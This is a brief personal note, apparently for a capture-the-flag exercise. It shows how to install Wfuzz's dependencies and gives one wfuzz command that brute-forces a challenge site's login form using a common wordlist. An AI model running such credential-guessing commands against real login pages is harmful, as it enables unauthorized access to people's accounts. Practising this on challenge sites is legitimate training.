# Wfuzz - The Web Bruteforcer
sudo apt-get install libssl-dev libcurl4-openssl-dev python-dev <br>
wfuzz.py -c -z file,/home/r00t/secTools/wfuzz/wordlist/general/common.txt --filter "(c=200 and h!=11405)" -d "username=FUZZ&amp;password=FUZZ" http://web.challenges.pwnerrank.com/9076ed9ad63a7cb3ecbaf02bfc299287/index.php
